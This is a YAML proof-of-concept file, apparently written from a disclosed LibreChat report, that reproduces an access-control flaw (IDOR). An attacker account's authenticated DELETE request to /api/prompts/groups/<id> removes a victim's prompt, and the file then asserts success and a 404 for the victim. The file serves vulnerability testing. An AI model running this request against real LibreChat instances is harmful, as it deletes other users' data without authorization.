poc:
  metadata:
    id: LibreChat-IDOR-DeletePrompt-Nov2024-v1.0
    title: Improper Access Control Allows deleting other users' prompts (LibreChat)
    dsl_version: "1.0" # Specify DSL version
    source_report:
      platform: Internal / Public Disclosure # Specify source if known
      reported_date: 2024-11-12 # Adjust year as needed based on current date: 2025-04-24 -> Use 2024 from report
    vulnerability:
      type: Improper Access Control (IDOR)
      cwe: CWE-284 # Improper Access Control
    target_application:
      name: danny-avila/librechat
    severity: High
    tags: [IDOR, Access Control, Delete, Prompt, API, LibreChat]

  context:
    description: Requires two active user accounts (Victim, Attacker) and a prompt created by the Victim. Assumes valid authentication tokens/cookies can be obtained.
    users:
      - id: victim_user
        description: "User A, owner of the prompt to be deleted."
        credentials_ref: "victim_user_credentials" # Handle to external credential store
      - id: attacker_user
        description: "User B, attempting the unauthorized deletion."
        credentials_ref: "attacker_user_credentials" # Handle to external credential store
    resources:
      - id: victim_prompt
        description: "The prompt created by the victim user that the attacker will target."
        # Identifier hardcoded from the original report example. Could be set dynamically in setup.
        identifier: "6721b4a6d634c1a37a25bf0e"
        type: prompt
    environment:
      # - id: target_host
      #   value: "localhost.com:8080" # From report example
      # - id: target_scheme
      #   value: "http" # Assuming HTTP based on report URLs
      # - id: target_base_url
      #   # Use variable substitution to build the base URL
      #   value: "{{ environment.target_scheme.value }}://{{ environment.target_host.value }}"
      - id: target_base_url
        value: "http://localhost:8080"

  # Global setup phase
  setup:
    - step: 1
      dsl: "Given the target LibreChat instance is running and accessible"
      action:
        type: check_target_availability
        url: "{{ environment.target_base_url.Value }}"
        timeout: "5s" # Example of optional execution hint

    # In a real automated scenario, these steps would use API calls or UI automation.
    # For this example, we assume they are pre-existing based on report steps.
    - step: 2
      dsl: "And user 'victim_user' exists and is authenticated"
      action:
        type: manual_action # Or 'authenticate' action if login flow is defined
        description: "Ensure victim user exists and valid credentials (e.g., Cookie, Bearer) are available via 'victim_user_credentials' reference."

    - step: 3
      dsl: "And user 'attacker_user' exists and is authenticated"
      action:
        type: manual_action # Or 'authenticate' action
        description: "Ensure attacker user exists and valid credentials (e.g., Cookie, Bearer) are available via 'attacker_user_credentials' reference."

    - step: 4
      dsl: "And prompt 'victim_prompt' with ID '{{ resources.victim_prompt.identifier }}' exists and belongs to 'victim_user'"
      action:
        # This could be an API call to create the prompt if needed, or just assumed true.
        type: ensure_resource_exists # Or manual_check
        resource: "victim_prompt"
        user_context: "victim_user" # Action performed as victim
        description: "Verify prompt exists via API or assume based on report steps."

  # Exploit phase
  exploit_scenario:
    name: Attacker (User B) deletes Victim's (User A) prompt via IDOR
    # No scenario-specific setup/teardown needed for this example
    steps:
      - step: 1
        dsl: "When 'attacker_user' sends a DELETE request to delete 'victim_prompt'"
        action:
          type: http_request
          # Use the attacker's context for authentication
          authentication_context: "attacker_user"
          request:
            method: DELETE
            # Construct URL using context variables
            url: "{{ environment.target_base_url.Value }}/api/prompts/groups/{{ resources.victim_prompt.identifier }}"
            headers:
              # Headers copied from the report, using placeholders for auth tokens
              # Assumes credential resolver provides .cookie and .bearer_token fields
              Host: "{{ environment.target_base_url.Value }}"
              Cookie: "refreshToken={{ users.attacker_user.credentials.cookie }}" # Placeholder resolved externally
              Sec-Ch-Ua: "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\""
              Accept: "application/json, text/plain, */*"
              Accept-Language: "en-US,en;q=0.9"
              Sec-Ch-Ua-Mobile: "?0"
              Authorization: "Bearer {{ users.attacker_user.credentials.bearer_token }}" # Placeholder resolved externally
              User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"
              Sec-Ch-Ua-Platform: "\"Windows\""
              Origin: "{{ environment.target_base_url.Value }}"
              Sec-Fetch-Site: "same-origin"
              Sec-Fetch-Mode: "cors"
              Sec-Fetch-Dest: "empty"
              Referer: "{{ environment.target_base_url.Value }}/d/prompts/some_referer_id" # Referer from example
              Accept-Encoding: "gzip, deflate, br"
              Priority: "u=1, i"
            body: null # No body expected for this DELETE

  # Immediate assertions after the exploit request
  assertions:
    - step: 1
      dsl: "Then the server should respond with HTTP status 200 OK indicating the delete operation was accepted"
      check:
        type: http_response_status
        expected_status: 200

    - step: 2
      dsl: "And the response body should contain the success message"
      check:
        type: http_response_body
        # Using json_path to be more specific than just 'contains'
        json_path:
          path: "$.promptGroup"
          value: "Prompt group deleted successfully"
        # Alternative check:
        # equals_json: '{"promptGroup":"Prompt group deleted successfully"}'

  # Optional verification steps to confirm impact
  verification:
    - step: 1
      dsl: "And when 'victim_user' tries to access their prompt 'victim_prompt'"
      action:
        type: http_request
        # Use the victim's context now
        authentication_context: "victim_user"
        request:
          method: GET
          # Attempt to retrieve the supposedly deleted prompt
          url: "{{ environment.target_base_url.Value }}/api/prompts/groups/{{ resources.victim_prompt.identifier }}"
          headers:
            # Use victim's authentication placeholder
            Authorization: "Bearer {{ users.victim_user.credentials.bearer_token }}"
            Accept: "application/json"

    - step: 2
      dsl: "Then the request should fail, indicating the prompt is gone (e.g., HTTP 404 Not Found)"
      check:
        type: http_response_status
        # Asserting the expected failure state for the victim trying to access deleted resource
        expected_status: 404